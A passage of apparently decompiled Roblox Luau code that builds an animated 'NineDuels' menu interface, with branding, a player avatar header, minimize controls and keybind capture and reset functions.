								textLabel.Font = Enum.Font.GothamBlack
								textLabel.ZIndex = 5
								instance5.Visible = false
								local frame7 = Instance.new("Frame")
								frame7.Name = "StatusBox"
								frame7.Size = UDim2.new(0, 82, 0, 30)
								frame7.Position = UDim2.new(0, 202, 0, 14)
								frame7.BackgroundColor3 = C.row
								frame7.BackgroundTransparency = 0.38
								frame7.BorderSizePixel = 0
								frame7.ZIndex = 3
								frame7.Parent = frame4
								guiCorner(frame7, 8)
								guiStroke(frame7, C.divider, 1)
								local textLabel2 = Instance.new("TextLabel", frame7)
								textLabel2.Size = UDim2.new(1, 0, 1, 0)
								textLabel2.BackgroundTransparency = 1
								textLabel2.Text = "STATUS: READY\nNINE DUELS"
								textLabel2.TextColor3 = C.textMuted
								textLabel2.TextSize = 8
								textLabel2.Font = Enum.Font.Gotham
								textLabel2.TextXAlignment = Enum.TextXAlignment.Center
								textLabel2.ZIndex = 4
								frame7.Visible = false
								local textLabel3 = Instance.new("TextLabel")
								textLabel3.Position = UDim2.new(0, 60, 0, 26)
								textLabel3.Size = UDim2.new(0, 154, 0, 26)
								textLabel3.BackgroundTransparency = 1
								textLabel3.Text = 'NineDuels<font color="#FFFFFF">.VS</font>'
								textLabel3.RichText = true
								textLabel3.TextColor3 = C.white
								textLabel3.TextSize = 22
								textLabel3.Font = Enum.Font.GothamBlack
								local instance6 = Instance.new("UIGradient")
								local colorSequence4 = ColorSequence.new
								local tbl20 = {}
								local v104 = ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 70, 70))
								local v105 = ColorSequenceKeypoint.new(0.36, Color3.fromRGB(100, 100, 100))
								local v106 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(245, 245, 245))
								local v107 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
								local v108 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(245, 245, 245))
								local v109 = ColorSequenceKeypoint.new(0.64, Color3.fromRGB(100, 100, 100))
								tbl20[1] = v104
								tbl20[2] = v105
								tbl20[3] = v106
								tbl20[4] = v107
								tbl20[5] = v108
								tbl20[6] = v109

								do
									local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(70, 70, 70)))
									table.move(values, 1, values.n, 7, tbl20)
								end

								instance6.Color = colorSequence4(tbl20)
								instance6.Parent = textLabel3
								instance6.Enabled = false

								task.spawn(function()
									while true do
										if textLabel3 and textLabel3.Parent then
											instance6.Offset = Vector2.new(-1, 0)
											local tween_ = TweenService:Create(
												instance6,
												TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
												{ Offset = Vector2.new(1, 0) }
											)
											tween_:Play()
											tween_.Completed:Wait()
											if textLabel3 and textLabel3.Parent then
												task.wait(0.05)
												continue
											end
										end

										break
									end
								end)

								textLabel3.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
								textLabel3.TextStrokeTransparency = 0.15
								textLabel3.TextXAlignment = Enum.TextXAlignment.Left
								textLabel3.Parent = frame4
								textLabel3.ZIndex = 3
								textLabel3.Visible = false
								local textLabel4 = Instance.new("TextLabel")
								textLabel4.Position = UDim2.new(0, 32, 0, 57)
								textLabel4.Size = UDim2.new(0, 154, 0, 15)
								textLabel4.BackgroundTransparency = 1
								textLabel4.Text = "discord.gg/nineduels"
								textLabel4.TextColor3 = C.blue
								textLabel4.TextSize = 11
								textLabel4.Font = Enum.Font.GothamMedium
								textLabel4.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
								textLabel4.TextStrokeTransparency = 0.25
								textLabel4.TextXAlignment = Enum.TextXAlignment.Left
								textLabel4.Parent = frame4
								textLabel4.ZIndex = 3
								textLabel4.Visible = false
								local uiGradient2 = Instance.new("UIGradient", textLabel4)
								uiGradient2.Enabled = true
								local colorSequence5 = ColorSequence.new
								local tbl21 = {}
								local v110 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
								local v111 = ColorSequenceKeypoint.new(0.32, Color3.fromRGB(230, 230, 230))
								local v112 = ColorSequenceKeypoint.new(0.44, Color3.fromRGB(245, 245, 245))
								local v113 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
								local v114 = ColorSequenceKeypoint.new(0.56, Color3.fromRGB(245, 245, 245))
								local v115 = ColorSequenceKeypoint.new(0.68, Color3.fromRGB(230, 230, 230))
								tbl21[1] = v110
								tbl21[2] = v111
								tbl21[3] = v112
								tbl21[4] = v113
								tbl21[5] = v114
								tbl21[6] = v115

								do
									local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 55)))
									table.move(values, 1, values.n, 7, tbl21)
								end

								uiGradient2.Color = colorSequence5(tbl21)

								task.spawn(function()
									while textLabel4 and textLabel4.Parent do
										uiGradient2.Offset = Vector2.new(-1, 0)
										local tween_ = TweenService:Create(
											uiGradient2,
											TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
											{ Offset = Vector2.new(1, 0) }
										)
										tween_:Play()
										tween_.Completed:Wait()
										task.wait(0.1)
									end
								end)

								local frame8 = Instance.new("Frame")
								frame8.Name = "HeaderPremium"
								frame8.Size = UDim2.new(0, 328, 0, 54)
								frame8.Position = UDim2.new(0, 18, 0, 23)
								frame8.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
								frame8.BackgroundTransparency = 0.08
								frame8.BorderSizePixel = 0
								frame8.ZIndex = 4
								frame8.Parent = frame4
								guiCorner(frame8, 12)
								local v116 = guiStroke(frame8, Color3.fromRGB(220, 220, 220), 1.25)
								v116.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
								local instance7 = Instance.new("UIGradient")
								local colorSequence6 = ColorSequence.new
								local tbl22 = {}
								local v117 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
								local v118 = ColorSequenceKeypoint.new(0.34, Color3.fromRGB(150, 150, 150))
								local v119 = ColorSequenceKeypoint.new(0.47, Color3.fromRGB(255, 255, 255))
								local v120 = ColorSequenceKeypoint.new(0.53, Color3.fromRGB(255, 255, 255))
								local v121 = ColorSequenceKeypoint.new(0.66, Color3.fromRGB(150, 150, 150))
								tbl22[1] = v117
								tbl22[2] = v118
								tbl22[3] = v119
								tbl22[4] = v120
								tbl22[5] = v121

								do
									local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 55)))
									table.move(values, 1, values.n, 6, tbl22)
								end

								instance7.Color = colorSequence6(tbl22)
								instance7.Rotation = 0
								instance7.Parent = v116

								task.spawn(function()
									while frame8 and frame8.Parent do
										instance7.Rotation = 0
										local tween_ = TweenService:Create(
											instance7,
											TweenInfo.new(4.6, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
											{ Rotation = 360 }
										)
										tween_:Play()
										tween_.Completed:Wait()
									end
								end)

								local instance8 = Instance.new("Frame", frame8)
								instance8.Name = "PremiumCut"
								instance8.Size = UDim2.new(0, 120, 0, 2)
								instance8.Position = UDim2.new(0, 16, 1, -8)
								instance8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
								instance8.BorderSizePixel = 0
								instance8.ZIndex = 6
								instance8.Visible = false
								local uiGradient3 = Instance.new("UIGradient", instance8)
								local color2 = Color3.fromRGB
								uiGradient3.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), color2(70, 70, 70))
								uiGradient3.Rotation = 0
								local frame9 = Instance.new("Frame", frame8)
								frame9.Size = UDim2.new(0, 3, 0, 34)
								frame9.Position = UDim2.new(0, 16, 0, 14)
								frame9.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
								frame9.BorderSizePixel = 0
								frame9.ZIndex = 6
								guiCorner(frame9, 2)
								local textLabel5 = Instance.new("TextLabel", frame8)
								textLabel5.Name = "BrandName"
								textLabel5.Position = UDim2.new(0, 31, 0, 10)
								textLabel5.Size = UDim2.new(0, 150, 0, 22)
								textLabel5.BackgroundTransparency = 1
								textLabel5.Text = "NINE DUELS"
								textLabel5.RichText = true
								textLabel5.TextColor3 = Color3.fromRGB(255, 255, 255)
								textLabel5.TextSize = 17
								textLabel5.Font = Enum.Font.GothamBlack
								textLabel5.TextXAlignment = Enum.TextXAlignment.Left
								textLabel5.ZIndex = 6
								local textLabel6 = Instance.new("TextLabel", frame8)
								textLabel6.Position = UDim2.new(0, 32, 0, 30)
								textLabel6.Size = UDim2.new(0, 150, 0, 12)
								textLabel6.BackgroundTransparency = 1
								textLabel6.Text = "discord.gg/nineduels"
								textLabel6.TextColor3 = Color3.fromRGB(235, 235, 235)
								textLabel6.TextSize = 7
								textLabel6.Font = Enum.Font.GothamMedium
								textLabel6.TextXAlignment = Enum.TextXAlignment.Left
								textLabel6.ZIndex = 6
								local instance9 = Instance.new("UIGradient", textLabel6)
								local colorSequence7 = ColorSequence.new
								local tbl23 = {}
								local v122 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
								local v123 = ColorSequenceKeypoint.new(0.42, Color3.fromRGB(245, 245, 245))
								local v124 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
								local v125 = ColorSequenceKeypoint.new(0.58, Color3.fromRGB(245, 245, 245))
								local new2 = ColorSequenceKeypoint.new
								local color3 = Color3.fromRGB
								tbl23[1] = v122
								tbl23[2] = v123
								tbl23[3] = v124
								tbl23[4] = v125

								do
									local values = table.pack(new2(1, color3(55, 55, 55)))
									table.move(values, 1, values.n, 5, tbl23)
								end

								instance9.Color = colorSequence7(tbl23)

								task.spawn(function()
									while textLabel6 and textLabel6.Parent do
										instance9.Offset = Vector2.new(-1, 0)
										local tween_ = TweenService:Create(
											instance9,
											TweenInfo.new(1.8, Enum.EasingStyle.Linear),
											{ Offset = Vector2.new(1, 0) }
										)
										tween_:Play()
										tween_.Completed:Wait()
										task.wait(0.05)
									end
								end)

								local frame10 = Instance.new("Frame", frame8)
								frame10.Name = "AvatarIdentity"
								frame10.Size = UDim2.new(0, 68, 0, 40)
								frame10.Position = UDim2.new(0, 204, 0, 9)
								frame10.BackgroundTransparency = 1
								frame10.BorderSizePixel = 0
								frame10.ZIndex = 6
								local textLabel7 = Instance.new("TextLabel", frame10)
								textLabel7.Name = "DisplayName"
								textLabel7.Position = UDim2.new(0, 0, 0, 2)
								textLabel7.Size = UDim2.new(1, 0, 0, 16)
								textLabel7.BackgroundTransparency = 1
								textLabel7.Text = player.DisplayName
								textLabel7.TextColor3 = Color3.fromRGB(235, 235, 235)
								textLabel7.TextSize = 9
								textLabel7.Font = Enum.Font.GothamBold
								textLabel7.TextXAlignment = Enum.TextXAlignment.Right
								textLabel7.TextTruncate = Enum.TextTruncate.AtEnd
								textLabel7.ZIndex = 7
								local instance10 = Instance.new("TextLabel", frame10)
								instance10.Name = "Username"
								instance10.Position = UDim2.new(0, 0, 0, 19)
								instance10.Size = UDim2.new(1, 0, 0, 12)
								instance10.BackgroundTransparency = 1
								instance10.Text = "@" .. player.Name
								instance10.TextColor3 = Color3.fromRGB(135, 135, 135)
								instance10.TextSize = 7
								instance10.Font = Enum.Font.GothamMedium
								instance10.TextXAlignment = Enum.TextXAlignment.Right
								instance10.TextTruncate = Enum.TextTruncate.AtEnd
								instance10.ZIndex = 7
								local imageLabel3 = Instance.new("ImageLabel", frame8)
								imageLabel3.Name = "Avatar"
								imageLabel3.Size = UDim2.new(0, 42, 0, 42)
								imageLabel3.Position = UDim2.new(0, 282, 0, 8)
								imageLabel3.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
								imageLabel3.BorderSizePixel = 0
								imageLabel3.Image = "rbxthumb://type=AvatarHeadShot&id="
									.. player.UserId
									.. "&w=150&h=150"
								imageLabel3.ScaleType = Enum.ScaleType.Crop
								imageLabel3.ZIndex = 6
								guiCorner(imageLabel3, 21)
								local v126 = guiStroke(imageLabel3, Color3.fromRGB(220, 220, 220), 1.4)
								v126.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
								local uiGradient4 = Instance.new("UIGradient", v126)
								local colorSequence8 = ColorSequence.new
								local tbl24 = {}
								local v127 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
								local v128 = ColorSequenceKeypoint.new(0.45, Color3.fromRGB(220, 220, 220))
								local v129 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
								local v130 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(220, 220, 220))
								local new3 = ColorSequenceKeypoint.new
								local color4 = Color3.fromRGB
								local v131 = 55
								tbl24[1] = v127
								tbl24[2] = v128
								tbl24[3] = v129
								tbl24[4] = v130

								do
									local values = table.pack(new3(1, color4(55, v131, 55)))
									table.move(values, 1, values.n, 5, tbl24)
								end

								uiGradient4.Color = colorSequence8(tbl24)

								task.spawn(function()
									while uiGradient4 and uiGradient4.Parent do
										uiGradient4.Rotation = (uiGradient4.Rotation + 3) % 360
										task.wait(0.025)
									end
								end)

								local frame11 = Instance.new("Frame", frame8)
								frame11.Name = "OnlineIndicator"
								frame11.Size = UDim2.new(0, 7, 0, 7)
								frame11.Position = UDim2.new(0, 314, 0, 36)
								frame11.BackgroundColor3 = Color3.fromRGB(235, 235, 235)
								frame11.BorderSizePixel = 0
								frame11.ZIndex = 8
								guiCorner(frame11, 4)
								local border = Enum.ApplyStrokeMode.Border
								guiStroke(frame11, Color3.fromRGB(14, 14, 14), 2).ApplyStrokeMode = border
								local textButton = Instance.new("TextButton")
								textButton.Name = "HeaderMinimize"
								textButton.Size = UDim2.new(0, 32, 0, 32)
								textButton.Position = UDim2.new(1, -48, 0, 33)
								textButton.BackgroundColor3 = C.bgDark
								textButton.BackgroundTransparency = 0.04
								textButton.BorderSizePixel = 0
								textButton.Text = "▼"
								textButton.TextColor3 = C.textMuted
								textButton.Font = Enum.Font.GothamBold
								textButton.TextSize = 13
								textButton.ZIndex = 5
								textButton.Parent = frame4
								guiCorner(textButton, 9)
								local v132 = guiStroke(textButton, Color3.fromRGB(220, 220, 220), 1.25)
								v132.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
								v132.Transparency = 0.08
								local instance11 = Instance.new("UIGradient", v132)
								local colorSequence9 = ColorSequence.new
								local tbl25 = {}
								local v133 = ColorSequenceKeypoint.new(0, Color3.fromRGB(55, 55, 55))
								local v134 = ColorSequenceKeypoint.new(0.42, Color3.fromRGB(190, 190, 190))
								local v135 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))
								local v136 = ColorSequenceKeypoint.new(0.58, Color3.fromRGB(190, 190, 190))
								local new4 = ColorSequenceKeypoint.new
								local color5 = Color3.fromRGB
								tbl25[1] = v133
								tbl25[2] = v134
								tbl25[3] = v135
								tbl25[4] = v136

								do
									local values = table.pack(new4(1, color5(55, 55, 55)))
									table.move(values, 1, values.n, 5, tbl25)
								end

								instance11.Color = colorSequence9(tbl25)

								task.spawn(function()
									while instance11 and instance11.Parent do
										instance11.Rotation = (instance11.Rotation + 4) % 360
										task.wait(0.025)
									end
								end)

								textButton.MouseEnter:Connect(function()
									tw(
										textButton,
										{ BackgroundColor3 = Color3.fromRGB(28, 28, 28), TextColor3 = C.text }
									)
								end)

								textButton.MouseLeave:Connect(function()
									tw(textButton, { BackgroundColor3 = C.bgDark, TextColor3 = C.textMuted })
								end)

								local flag18 = false
								GuiRefs.guiMinimized = false
								local udim2 = UDim2.new(0, 420, 0, 528)
								local udim22 = UDim2.new(0, 420, 0, 96)

								local function showGui()
									flag18 = false
									GuiRefs.guiMinimized = false
									instance.Visible = true
									textButton.Text = "▼"
									textButton.TextSize = 13
									tw(textButton, { BackgroundColor3 = C.bgDark, TextColor3 = C.textMuted })
									TweenService:Create(
										instance,
										TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
										{ Size = udim2 }
									):Play()
									TweenService:Create(
										uiScale,
										TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
										{ Scale = uiScaleObj and uiScaleObj.Scale or 1 }
									):Play()
									frame2.Visible = true

									if GuiRefs.hsep then
										GuiRefs.hsep.Visible = true
									end

									if GuiRefs.leftPanel then
										GuiRefs.leftPanel.Visible = true
									end

									if GuiRefs.categoryList then
										GuiRefs.categoryList.Visible = true
									end

									if GuiRefs.contentFrame then
										GuiRefs.contentFrame.Visible = true
									end
								end

								local function hideGui()
									flag18 = true
									GuiRefs.guiMinimized = true
									textButton.Text = "▶"
									textButton.TextSize = 13
									tw(
										textButton,
										{ BackgroundColor3 = Color3.fromRGB(28, 28, 36), TextColor3 = C.text }
									)
									local tbl26 = { Size = udim22 }
									TweenService:Create(
										instance,
										TweenInfo.new(0.38, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
										tbl26
									):Play()

									frame2.Visible = true

									if GuiRefs.hsep then
										GuiRefs.hsep.Visible = false
									end

									if GuiRefs.leftPanel then
										GuiRefs.leftPanel.Visible = false
									end

									if GuiRefs.categoryList then
										GuiRefs.categoryList.Visible = false
									end

									if GuiRefs.contentFrame then
										GuiRefs.contentFrame.Visible = false
									end

									return
								end

								GuiRefs.showGui = showGui
								GuiRefs.hideGui = hideGui

								textButton.MouseButton1Click:Connect(function()
									if flag18 then
										showGui()
									else
										hideGui()
									end
								end)

								local frame12 = Instance.new("Frame")
								frame12.Position = UDim2.new(0, 16, 0, 94)
								frame12.Size = UDim2.new(1, -32, 0, 1)
								frame12.BackgroundColor3 = C.blue
								frame12.BackgroundTransparency = 0.35
								frame12.BorderSizePixel = 0
								frame12.Parent = frame
								frame12.ZIndex = 2
								frame12.Visible = false
								local instance12 = Instance.new("UIGradient", frame12)
								instance12.Color = ColorSequence.new(C.blue, C.blue)
								instance12.Transparency = NumberSequence.new(0.2, 0.5)
								GuiRefs.hsep = frame12
								LeftPanel = Instance.new("Frame")
								LeftPanel.Name = "TopNav"
								LeftPanel.Size = UDim2.new(1, -20, 0, 44)
								LeftPanel.Position = UDim2.new(0, 10, 0, 104)
								LeftPanel.BackgroundColor3 = C.bgDark
								LeftPanel.BackgroundTransparency = 0.1
								LeftPanel.ClipsDescendants = true
								LeftPanel.BorderSizePixel = 0
								LeftPanel.Parent = frame
								LeftPanel.ZIndex = 2
								guiCorner(LeftPanel, 10)
								guiStroke(LeftPanel, C.divider, 1).Transparency = 0.4
								GuiRefs.leftPanel = LeftPanel
								local frame13 = Instance.new("Frame")
								frame13.Name = "CategoryList"
								frame13.Size = UDim2.new(1, 0, 1, 0)
								frame13.BackgroundTransparency = 1
								frame13.BorderSizePixel = 0
								frame13.Parent = LeftPanel
								local uiListLayout = Instance.new("UIListLayout")
								uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout.Padding = UDim.new(0, 2)
								uiListLayout.Parent = frame13
								uiListLayout.FillDirection = Enum.FillDirection.Horizontal
								uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
								uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
								uiListLayout.Padding = UDim.new(0, 4)
								local uiPadding = Instance.new("UIPadding")
								uiPadding.PaddingLeft = UDim.new(0, 4)
								uiPadding.PaddingRight = UDim.new(0, 4)
								uiPadding.PaddingTop = UDim.new(0, 4)
								uiPadding.PaddingBottom = UDim.new(0, 4)
								uiPadding.Parent = frame13
								GuiRefs.categoryList = frame13
								local frame14 = Instance.new("Frame")
								frame14.Name = "SideIdentity"
								frame14.Size = UDim2.new(1, 0, 0, 132)
								frame14.Position = UDim2.new(0, 0, 0, 150)
								frame14.BackgroundTransparency = 1
								frame14.BorderSizePixel = 0
								frame14.ZIndex = 10
								frame14.Parent = LeftPanel
								frame14.Visible = false
								local imageLabel4 = Instance.new("ImageLabel", frame14)
								imageLabel4.Size = UDim2.new(0, 64, 0, 64)
								imageLabel4.Position = UDim2.new(0.5, -32, 0, 0)
								imageLabel4.BackgroundColor3 = C.bgDark
								imageLabel4.BorderSizePixel = 0
								imageLabel4.Image = "rbxthumb://type=AvatarHeadShot&id="
									.. player.UserId
									.. "&w=150&h=150"
								imageLabel4.ScaleType = Enum.ScaleType.Crop
								imageLabel4.ZIndex = 11
								guiCorner(imageLabel4, 60)
								local border2 = Enum.ApplyStrokeMode.Border
								guiStroke(imageLabel4, C.blue, 2).ApplyStrokeMode = border2
								local instance13 = Instance.new("TextLabel", frame14)
								instance13.Position = UDim2.new(0, 0, 0, 72)
								instance13.Size = UDim2.new(1, 0, 0, 14)
								instance13.BackgroundTransparency = 1
								instance13.Text = "nineduels.vs"
								instance13.TextColor3 = C.textMuted
								instance13.TextSize = 9
								instance13.Font = Enum.Font.GothamMedium
								instance13.ZIndex = 11
								local textLabel8 = Instance.new("TextLabel", frame14)
								textLabel8.Position = UDim2.new(0, 0, 0, 88)
								textLabel8.Size = UDim2.new(1, 0, 0, 18)
								textLabel8.BackgroundTransparency = 1
								textLabel8.Text = player.DisplayName
								textLabel8.TextColor3 = C.text
								textLabel8.TextSize = 11
								textLabel8.Font = Enum.Font.GothamBold
								textLabel8.TextTruncate = Enum.TextTruncate.AtEnd
								textLabel8.ZIndex = 11
								local instance14 = Instance.new("TextLabel", frame14)
								instance14.Position = UDim2.new(0, 0, 0, 108)
								instance14.Size = UDim2.new(1, 0, 0, 12)
								instance14.BackgroundTransparency = 1
								instance14.Text = "FEATURES LOADED"
								instance14.TextColor3 = C.blue
								instance14.TextSize = 8
								instance14.Font = Enum.Font.GothamBold
								instance14.ZIndex = 11
								local scrollingFrame = Instance.new("ScrollingFrame")
								scrollingFrame.Name = "ContentFrame"
								scrollingFrame.Size = UDim2.new(1, -20, 1, -166)
								scrollingFrame.Position = UDim2.new(0, 10, 0, 156)
								scrollingFrame.BackgroundTransparency = 1
								scrollingFrame.BorderSizePixel = 0
								scrollingFrame.ScrollBarThickness = 4
								scrollingFrame.ScrollBarImageColor3 = C.blue
								scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
								scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
								scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y
								scrollingFrame.ScrollingEnabled = true
								scrollingFrame.Active = true
								scrollingFrame.ElasticBehavior = Enum.ElasticBehavior.Never
								scrollingFrame.Parent = frame
								GuiRefs.contentFrame = scrollingFrame
								local uiListLayout2 = Instance.new("UIListLayout")
								uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout2.Padding = UDim.new(0, 6)
								uiListLayout2.Parent = scrollingFrame
								local uiPadding2 = Instance.new("UIPadding")
								uiPadding2.PaddingLeft = UDim.new(0, 12)
								uiPadding2.PaddingRight = UDim.new(0, 12)
								uiPadding2.PaddingTop = UDim.new(0, 4)
								uiPadding2.PaddingBottom = UDim.new(0, 8)
								uiPadding2.Parent = scrollingFrame
								local frame15 = Instance.new("Frame")
								frame15.Position = UDim2.new(0, 10, 0, 148)
								frame15.Size = UDim2.new(1, -20, 0, 1)
								frame15.BackgroundColor3 = C.blue
								frame15.BackgroundTransparency = 0.65
								frame15.BorderSizePixel = 0
								frame15.Parent = frame
								frame15.ZIndex = 2
							end

							fn37()
							local innerStroke = GuiRefs.innerStroke

							if innerStroke then
								task.spawn(function()
									while innerStroke and innerStroke.Parent do
										for i = 1, 40 do
											local n35 = i / 36
											local n36 = math.floor(255 - 120 * n35)
											innerStroke.Color = Color3.fromRGB(n36, n36, n36)
											innerStroke.Thickness = 1.2 + 0.5 * n35
											task.wait(0.016)
										end

										for i = 1, 40 do
											local n35 = i / 36
											local n36 = math.floor(135 + 120 * n35)
											innerStroke.Color = Color3.fromRGB(n36, n36, n36)
											innerStroke.Thickness = 1.35 - 0.5 * n35
											task.wait(0.016)
										end
									end
								end)
							end

							KeyListen = { cb = nil, label = nil, active = false, originalText = nil }

							KEY_ALIASES = {
								ButtonA = "A",
								ButtonB = "B",
								ButtonX = "X",
								ButtonY = "Y",
								ButtonR1 = "RB",
								ButtonR2 = "RT",
								ButtonL1 = "LB",
								ButtonL2 = "LT",
								DPadUp = "D↑",
								DPadDown = "D↓",
								DPadLeft = "D←",
								DPadRight = "D→",
								ButtonStart = "▶",
								ButtonSelect = "◀",
								LeftShift = "LShift",
								RightShift = "RShift",
								LeftControl = "LCtrl",
								RightControl = "RCtrl",
								LeftAlt = "LAlt",
								RightAlt = "RAlt",
								LeftSuper = "LSuper",
								RightSuper = "RSuper",
								Return = "Enter",
								BackSpace = "Backspace",
								Tab = "Tab",
								CapsLock = "CapsLock",
								Escape = "Esc",
								Space = "Space",
								PageUp = "PgUp",
								PageDown = "PgDn",
								End = "End",
								Home = "Home",
								Insert = "Ins",
								Delete = "Del",
								Up = "↑",
								Down = "↓",
								Left = "←",
								Right = "→",
								F1 = "F1",
								F2 = "F2",
								F3 = "F3",
								F4 = "F4",
								F5 = "F5",
								F6 = "F6",
								F7 = "F7",
								F8 = "F8",
								F9 = "F9",
								F10 = "F10",
								F11 = "F11",
								F12 = "F12",
								Print = "PrtScn",
								ScrollLock = "ScrLk",
								Pause = "Pause",
								Minus = "-",
								Equals = "=",
								LeftBracket = "[",
								RightBracket = "]",
								BackSlash = "\\",
								Semicolon = ";",
								Quote = "'",
								Comma = ",",
								Period = ".",
								Slash = "/",
								Backquote = "`",
							}

							prettyKey = function(arg)
								if not arg or arg == Enum.KeyCode.Unknown then
									return "NONE"
								end
								return KEY_ALIASES[arg.Name] or arg.Name
							end

							setKeybind = function(arg, kb)
								if arg then
									if not kb or kb == Enum.KeyCode.Unknown then
										Keys[arg] = nil

										if KB[arg] then
											KB[arg].kb = nil
											KB[arg].gp = nil
										end

										return
									end

									if Keys[arg] == kb then
										return
									end

									for k, v86 in pairs(Keys) do
										if k ~= arg and v86 == kb then
											Keys[k] = nil

											if KeybindChipRefs and KeybindChipRefs[k] then
												task.defer(function()
													refreshKeybindChip(k)
												end)
											end
										end
									end

									Keys[arg] = kb

									if KB[arg] then
										KB[arg].kb = kb
										KB[arg].gp = nil
									end

									return
								end

								return
							end

							KeybindChipRefs = {}
							KeybindClearRefs = {}
							KeybindStrokeRefs = {}

							refreshKeybindChip = function(arg)
								local v86 = KeybindChipRefs and KeybindChipRefs[arg]
								if not v86 then
									return
								end
								local flag18 = Keys[arg] ~= nil
								local v87 = prettyKey(Keys[arg])
								local color = Color3.fromRGB(46, 46, 58)

								for i, v88 in ipairs(v86) do
									if v88 and v88.Parent then
										v88.BackgroundTransparency = 1
										v88.Text = v87
										v88.TextColor3 = flag18 and Color3.fromRGB(255, 255, 255)
											or Color3.fromRGB(175, 175, 190)
										local v89 = KeybindClearRefs[arg] and KeybindClearRefs[arg][i]

										if v89 and v89.Parent then
											v89.TextColor3 = flag18 and Color3.fromRGB(86, 86, 104)
												or Color3.fromRGB(44, 44, 54)
										end

										local v90 = KeybindStrokeRefs[arg] and KeybindStrokeRefs[arg][i]

										if v90 then
											if v90.k then
												tw(v90.k, { Color = color })
											end

											if v90.c then
												tw(v90.c, { Color = color })
											end
										end
									end
								end
							end

							resetAllKeybinds = function()
								for k in pairs(Keys) do
									Keys[k] = nil
								end

								local v86 = pairs
								local tbl17 = KeybindChipRefs or {}

								for k in v86(tbl17) do
									refreshKeybindChip(k)
								end

								saveConfig()
								notify("Keybinds", "All keybinds reset to NONE", "save", 2.2)
							end

							cancelKL = function()
								if KeyListen.label then
									local attribute = KeyListen.label:GetAttribute("KeybindId")

									if attribute then
										refreshKeybindChip(attribute)
									end
								end

								KeyListen.cb = nil
								KeyListen.label = nil
								KeyListen.active = false
								KeyListen.originalText = nil
							end

							startKL = function(label, cb)
								cancelKL()
								KeyListen.cb = cb
								KeyListen.label = label
								KeyListen.active = true
								KeyListen.originalText = label.Text
								label.Text = "..."
								local attribute = label:GetAttribute("KeybindId")

								if attribute then
									tw(label, { TextColor3 = Color3.fromRGB(170, 170, 170) })
									local v86 = KeybindStrokeRefs[attribute]

									if v86 then
										for _, v87 in ipairs(v86) do
											if v87.k then
												tw(v87.k, { Color = Color3.fromRGB(140, 140, 140) })
											end

											if v87.c then
												tw(v87.c, { Color = Color3.fromRGB(140, 140, 140) })
											end
										end
									end
								end

								local v86 = label
								local originalText = KeyListen.originalText

								task.delay(8, function()
									if KeyListen.label == v86 and KeyListen.active then
										local attribute2 = label:GetAttribute("KeybindId")
										cancelKL()

										if label and label.Parent then
											if attribute2 then
												refreshKeybindChip(attribute2)
											else
												label.Text = originalText or label.Text
											end
										end
									end
								end)
							end

							UIS.InputBegan:Connect(function(input, gameProcessed)
								if not KeyListen.active then
									return
								end

								if gameProcessed then
									return
								end
								local userInputType = input.UserInputType

								if
									userInputType ~= Enum.UserInputType.Keyboard
									and userInputType ~= Enum.UserInputType.Gamepad1
								then
									return
								end
								local keyCode = input.KeyCode
								if keyCode == Enum.KeyCode.Unknown then
									return
								end

								if keyCode == Enum.KeyCode.Escape then
									cancelKL()
									return
								end
								local cb = KeyListen.cb
								local label = KeyListen.label
								cancelKL()

								if label and label.Parent then
									label.Text = prettyKey(keyCode)
								end

								if cb then
									task.spawn(cb, keyCode)
								end
							end)

							addSectLbl = function(arg, text, layoutOrder)
								if layoutOrder and layoutOrder > 0 then
									local frame = Instance.new("Frame", arg)
									frame.Name = "SectionSpacer"
									frame.Size = UDim2.new(1, 0, 0, 10)
									frame.BackgroundTransparency = 1
									frame.BorderSizePixel = 0
									frame.LayoutOrder = layoutOrder - 0.05
								end

								local frame = Instance.new("Frame", arg)
								frame.Name = "SectionHeader"
								frame.Size = UDim2.new(1, 0, 0, 34)
								frame.BackgroundColor3 = C.row
								frame.BackgroundTransparency = 0.1
								frame.BorderSizePixel = 0
								frame.LayoutOrder = layoutOrder
								guiCorner(frame, 9)
								local v86 = guiStroke(frame, C.divider, 1)
								v86.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
								v86.Transparency = 0.28
								local instance = Instance.new("Frame", frame)
